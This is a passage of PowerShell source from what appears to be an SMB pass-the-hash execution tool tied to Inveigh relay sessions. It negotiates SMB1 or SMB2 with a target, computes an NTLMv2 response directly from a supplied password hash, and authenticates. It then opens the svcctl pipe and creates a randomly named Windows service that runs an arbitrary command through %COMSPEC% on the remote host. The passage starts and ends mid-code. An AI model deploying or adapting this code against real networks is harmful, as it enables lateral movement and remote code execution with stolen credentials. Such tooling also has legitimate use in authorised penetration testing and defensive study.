    if(!$Inveigh)

    {

        Write-Output "[-] Inveigh Relay session not found"

        $startup_error = $true

    }

    elseif(!$inveigh.session_socket_table[$session].Connected)

    {

        Write-Output "[-] Inveigh Relay session not connected"

        $startup_error = $true

    }

    $Target = $inveigh.session_socket_table[$session].Client.RemoteEndpoint.Address.IPaddressToString

}

$process_ID = [System.Diagnostics.Process]::GetCurrentProcess() | Select-Object -expand id

$process_ID = [System.BitConverter]::ToString([System.BitConverter]::GetBytes($process_ID))

[Byte[]]$process_ID = $process_ID.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

if(!$inveigh_session)

{

    $client = New-Object System.Net.Sockets.TCPClient

    $client.Client.ReceiveTimeout = 60000

}

if(!$startup_error -and !$inveigh_session)

{

    try

    {

        $client.Connect($Target,"445")

    }

    catch

    {

        Write-Output "[-] $Target did not respond"

    }

}

if($client.Connected -or (!$startup_error -and $inveigh.session_socket_table[$session].Connected))

{

    $client_receive = New-Object System.Byte[] 1024

    if(!$inveigh_session)

    {

        $client_stream = $client.GetStream()

        if($SMB_version -eq 'SMB2.1')

        {

            $stage = 'NegotiateSMB2'

        }

        else

        {

            $stage = 'NegotiateSMB'

        }

        while($stage -ne 'Exit')

        {

            try

            {

                switch ($stage)

                {

                    'NegotiateSMB'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x72 0x18 0x01,0x48 0xff,0xff $process_ID 0x00,0x00

                        $packet_SMB_data = New-PacketSMBNegotiateProtocolRequest $SMB_version

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try

                        {    

                            $client_stream.Write($client_send,0,$client_send.Length) > $null

                            $client_stream.Flush()

                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if([System.BitConverter]::ToString($client_receive[4..7]) -eq 'ff-53-4d-42')

                            {

                                $SMB_version = 'SMB1'

                                $stage = 'NTLMSSPNegotiate'

                                if([System.BitConverter]::ToString($client_receive[39]) -eq '0f')

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is required on $target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {

                                        Write-Verbose "[+] SMB signing is required"

                                        $SMB_signing = $true

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }

                                }

                                else

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is not required on $target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {

                                        $SMB_signing = $false

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x05,0x82,0x08,0xa0

                                    }

                                }

                            }

                            else

                            {

                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is required on $target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {

                                        if($signing_check)

                                        {

                                            Write-Verbose "[+] SMB signing is required"

                                        }

                                        $SMB_signing = $true

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x15,0x82,0x08,0xa0

                                    }

                                }

                                else

                                {

                                    if($signing_check)

                                    {

                                        Write-Output "[+] SMB signing is not required on $target"

                                        $stage = 'Exit'

                                    }

                                    else

                                    {

                                        $SMB_signing = $false

                                        $session_key_length = 0x00,0x00

                                        $negotiate_flags = 0x05,0x80,0x08,0xa0

                                    }

                                }

                            }

                        }

                        catch

                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')

                            {

                                Write-Output "[-] SMB1 negotiation failed"

                                $negoitiation_failed = $true

                                $stage = 'Exit'

                            }

                        }

                    }

                    'NegotiateSMB2'

                    {

                        if($SMB_version -eq 'SMB2.1')

                        {

                            $message_ID = 0

                        }

                        else

                        {

                            $message_ID = 1

                        }

                        $tree_ID = 0x00,0x00,0x00,0x00

                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00

                        $packet_SMB2_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID

                        $packet_SMB2_data = New-PacketSMB2NegotiateProtocolRequest

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')

                        {

                            if($signing_check)

                            {

                                Write-Output "[+] SMB signing is required on $target"

                                $stage = 'Exit'

                            }

                            else

                            {

                                if($signing_check)

                                {

                                    Write-Verbose "[+] SMB signing is required"

                                }

                                $SMB_signing = $true

                                $session_key_length = 0x00,0x00

                                $negotiate_flags = 0x15,0x82,0x08,0xa0

                            }

                        }

                        else

                        {

                            if($signing_check)

                            {

                                Write-Output "[+] SMB signing is not required on $target"

                                $stage = 'Exit'

                            }

                            else

                            {

                                $SMB_signing = $false

                                $session_key_length = 0x00,0x00

                                $negotiate_flags = 0x05,0x80,0x08,0xa0

                            }

                        }

                    }

                    'NTLMSSPNegotiate'

                    {

                        if($SMB_version -eq 'SMB1')

                        {

                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)

                            {

                                $packet_SMB_header["Flags2"] = 0x05,0x48

                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       

                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate

                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        }

                        else

                        {

                            $message_ID++

                            $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags

                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       

                            $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate

                            $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                            $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()    

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'Exit'

                    }

                }

            }

            catch

            {

                Write-Output "[-] $($_.Exception.Message)"

                $negoitiation_failed = $true

            }

        }

        if(!$signing_check -and !$negoitiation_failed)

        {

            $NTLMSSP = [System.BitConverter]::ToString($client_receive)

            $NTLMSSP = $NTLMSSP -replace "-",""

            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")

            $NTLMSSP_bytes_index = $NTLMSSP_index / 2

            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive

            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive

            $session_ID = $client_receive[44..51]

            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]

            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]

            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]

            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"

            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $auth_hostname = (Get-ChildItem -path env:computername).Value

            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)

            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)

            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)

            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]

            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]

            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]

            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]

            $auth_domain_offset = 0x40,0x00,0x00,0x00

            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)

            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)

            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)

            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)

            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5

            $HMAC_MD5.key = $NTLM_hash_bytes

            $username_and_target = $username.ToUpper()

            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)

            $username_and_target_bytes += $auth_domain_bytes

            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)

            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})

            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,

                                    0x00,0x00,0x00,0x00 +

                                    $target_time_bytes +

                                    $client_challenge_bytes +

                                    0x00,0x00,0x00,0x00 +

                                    $target_details +

                                    0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes

            $HMAC_MD5.key = $NTLMv2_hash

            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)

            {

                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)

                $session_key = $session_base_key

                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256

                $HMAC_SHA256.key = $session_key

            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes

            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]

            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,

                                    0x03,0x00,0x00,0x00,

                                    0x18,0x00,

                                    0x18,0x00 +

                                    $auth_LM_offset +

                                    $NTLMv2_response_length +

                                    $NTLMv2_response_length +

                                    $auth_NTLM_offset +

                                    $auth_domain_length +

                                    $auth_domain_length +

                                    $auth_domain_offset +

                                    $auth_username_length +

                                    $auth_username_length +

                                    $auth_username_offset +

                                    $auth_hostname_length +

                                    $auth_hostname_length +

                                    $auth_hostname_offset +

                                    $session_key_length +

                                    $session_key_length +

                                    $session_key_offset +

                                    $negotiate_flags +

                                    $auth_domain_bytes +

                                    $auth_username_bytes +

                                    $auth_hostname_bytes +

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +

                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')

            {

                $SMB_user_ID = $client_receive[32,33]

                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)

                {

                    $packet_SMB_header["Flags2"] = 0x05,0x48

                }

                $packet_SMB_header["UserID"] = $SMB_user_ID

                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response

                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      

                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate

                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

            }

            else

            {

                $message_ID++

                $packet_SMB2_header = New-PacketSMB2Header 0x01,0x00 0x01,0x00 $false $message_ID  $process_ID $tree_ID $session_ID

                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response

                $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header

                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        

                $packet_SMB2_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth

                $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length

                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data

            }

            try

            {

                $client_stream.Write($client_send,0,$client_send.Length) > $null

                $client_stream.Flush()

                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')

                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')

                    {

                        Write-Verbose "[+] $output_username successfully authenticated on $Target"

                        $login_successful = $true

                    }

                    else

                    {

                        Write-Output "[!] $output_username failed to authenticate on $Target"

                        $login_successful = $false

                    }

                }

                else

                {

                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')

                    {

                        Write-Verbose "[+] $output_username successfully authenticated on $Target"

                        $login_successful = $true

                    }

                    else

                    {

                        Write-Output "[!] $output_username failed to authenticate on $Target"

                        $login_successful = $false

                    }

                }

            }

            catch

            {

                Write-Output "[-] $($_.Exception.Message)"

            }

        }

    }

    if($login_successful -or $inveigh_session)

    {

        if($inveigh_session)

        {

            if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')

            {

                Write-Output "[*] Pausing due to Inveigh Relay session lock"

                Start-Sleep -s 2

            }

            $inveigh.session_lock_table[$session] = 'locked'

            $client = $inveigh.session_socket_table[$session]

            $client_stream = $client.GetStream()

            $session_ID = $inveigh.session_table[$session]

            $message_ID =  $inveigh.session_message_ID_table[$session]

            $tree_ID = 0x00,0x00,0x00,0x00

            $SMB_signing = $false

        }

        $SMB_path = "\\" + $Target + "\IPC$"

        if($SMB_version -eq 'SMB1')

        {

            $SMB_path_bytes = [System.Text.Encoding]::UTF8.GetBytes($SMB_path) + 0x00

        }

        else

        {

            $SMB_path_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_path)

        }

        $named_pipe_UUID = 0x81,0xbb,0x7a,0x36,0x44,0x98,0xf1,0x35,0xad,0x32,0x98,0xf0,0x38,0x00,0x10,0x03

        if(!$Service)

        {

            $SMB_service_random = [String]::Join("00-",(1..20 | ForEach-Object{"{0:X2}-" -f (Get-Random -Minimum 65 -Maximum 90)}))

            $SMB_service = $SMB_service_random -replace "-00",""

            $SMB_service = $SMB_service.Substring(0,$SMB_service.Length - 1)

            $SMB_service = $SMB_service.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $SMB_service = New-Object System.String ($SMB_service,0,$SMB_service.Length)

            $SMB_service_random += '00-00-00-00-00'

            $SMB_service_bytes = $SMB_service_random.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

        }

        else

        {

            $SMB_service = $Service

            $SMB_service_bytes = [System.Text.Encoding]::Unicode.GetBytes($SMB_service)

            if([Bool]($SMB_service.Length % 2))

            {

                $SMB_service_bytes += 0x00,0x00

            }

            else

            {

                $SMB_service_bytes += 0x00,0x00,0x00,0x00

            }

        }

        $SMB_service_length = [System.BitConverter]::GetBytes($SMB_service.Length + 1)

        if($CommandCOMSPEC -eq 'Y')

        {

            $Command = "%COMSPEC% /C `"" + $Command + "`""

        }

        else

        {

            $Command = "`"" + $Command + "`""

        }

        [System.Text.Encoding]::UTF8.GetBytes($Command) | ForEach-Object{$SMBExec_command += "{0:X2}-00-" -f $_}

        if([Bool]($Command.Length % 2))

        {

            $SMBExec_command += '00-00'

        }

        else

        {

            $SMBExec_command += '00-00-00-00'

        }    

        $SMBExec_command_bytes = $SMBExec_command.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}  

        $SMBExec_command_length_bytes = [System.BitConverter]::GetBytes($SMBExec_command_bytes.Length / 2)

        $SMB_split_index = 4256

        if($SMB_version -eq 'SMB1')

        {

            $stage = 'TreeConnectAndXRequest'

            while ($stage -ne 'Exit')

            {

                switch ($stage)

                {

                    'CheckAccess'

                    {

                        if([System.BitConverter]::ToString($client_receive[108..111]) -eq '00-00-00-00' -and [System.BitConverter]::ToString($client_receive[88..107]) -ne '00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00')

                        {

                            $SMB_service_manager_context_handle = $client_receive[88..107]

                            if($SMB_execute)

                            {

                                Write-Verbose "$output_username has Service Control Manager write privilege on $Target"  

                                $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes

                                $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                                if($SCM_data.Length -lt $SMB_split_index)

                                {

                                    $stage = 'CreateServiceW'

                                }

                                else

                                {

                                    $stage = 'CreateServiceW_First'

                                }

                            }

                            else

                            {

                                Write-Output "$output_username has Service Control Manager write privilege on $Target"

                                $SMB_close_service_handle_stage = 2

                                $stage = 'CloseServiceHandle'

                            }

                        }

                        elseif([System.BitConverter]::ToString($client_receive[108..111]) -eq '05-00-00-00')

                        {

                            Write-Output "[-] $output_username does not have Service Control Manager write privilege on $Target"

                            $stage = 'Exit'

                        }

                        else

                        {

                            Write-Output "[-] Something went wrong with $Target"

                            $stage = 'Exit'

                        }

                    }

                    'CloseRequest'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x04 0x18 0x07,0xc8 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBCloseRequest 0x00,0x40

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'TreeDisconnect'

                    }

                    'CloseServiceHandle'

                    {

                        if($SMB_close_service_handle_stage -eq 1)

                        {

                            Write-Verbose "Service $SMB_service deleted on $Target"

                            $SMB_close_service_handle_stage++

                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_context_handle

                        }

                        else

                        {

                            $stage = 'CloseRequest'

                            $packet_SCM_data = New-PacketSCMCloseServiceHandle $SMB_service_manager_context_handle

                        }

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x05,0x00,0x00,0x00 0x00,0x00 0x00,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                    }

                    'CreateAndXRequest'

                    {

                        $SMB_named_pipe_bytes = 0x5c,0x73,0x76,0x63,0x63,0x74,0x6c,0x00 # \svcctl

                        $SMB_tree_ID = $client_receive[28,29]

                        $packet_SMB_header = New-PacketSMBHeader 0xa2 0x18 0x02,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBNTCreateAndXRequest $SMB_named_pipe_bytes

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data 

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'RPCBind'

                    }

                    'CreateServiceW'

                    {

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $packet_SCM_data = New-PacketSCMCreateServiceW $SMB_service_manager_context_handle $SMB_service_bytes $SMB_service_length $SMBExec_command_bytes $SMBExec_command_length_bytes

                        $SCM_data = ConvertFrom-PacketOrderedDictionary $packet_SCM_data

                        $packet_RPC_data = New-PacketRPCRequest 0x03 $SCM_data.Length 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header   

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID ($RPC_data.Length + $SCM_data.Length)

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data

                        $RPC_data_length = $SMB_data.Length + $SCM_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data + $SCM_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        $stage = 'ReadAndXRequest'

                        $stage_next = 'StartServiceW'

                    }

                    'CreateServiceW_First'

                    {

                        $SMB_split_stage_final = [Math]::Ceiling($SCM_data.Length / $SMB_split_index)

                        $packet_SMB_header = New-PacketSMBHeader 0x2f 0x18 0x05,0x28 $SMB_tree_ID $process_ID $SMB_user_ID

                        if($SMB_signing)

                        {

                            $packet_SMB_header["Flags2"] = 0x05,0x48

                            $SMB_signing_counter = $SMB_signing_counter + 2 

                            [Byte[]]$SMB_signing_sequence = [System.BitConverter]::GetBytes($SMB_signing_counter) + 0x00,0x00,0x00,0x00

                            $packet_SMB_header["Signature"] = $SMB_signing_sequence

                        }

                        $SCM_data_first = $SCM_data[0..($SMB_split_index - 1)]

                        $packet_RPC_data = New-PacketRPCRequest 0x01 0 0 0 0x02,0x00,0x00,0x00 0x00,0x00 0x0c,0x00 $SCM_data_first

                        $packet_RPC_data["AllocHint"] = [System.BitConverter]::GetBytes($SCM_data.Length)

                        $SMB_split_index_tracker = $SMB_split_index

                        $RPC_data = ConvertFrom-PacketOrderedDictionary $packet_RPC_data

                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        $packet_SMB_data = New-PacketSMBWriteAndXRequest $SMB_FID $RPC_data.Length

                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data     

                        $RPC_data_length = $SMB_data.Length + $RPC_data.Length

                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $RPC_data_length

                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)

                        {

                            $SMB_sign = $session_key + $SMB_header + $SMB_data + $RPC_data

                            $SMB_signature = $MD5.ComputeHash($SMB_sign)

                            $SMB_signature = $SMB_signature[0..7]

                            $packet_SMB_header["Signature"] = $SMB_signature

                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header

                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data + $RPC_data

                        $client_stream.Write($client_send,0,$client_send.Length) > $null

                        $client_stream.Flush()

                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($SMB_split_stage_final -le 2)

                        {

                            $stage = 'CreateServiceW_Last'

                        }

                        else

                        {

                            $SMB_split_stage = 2

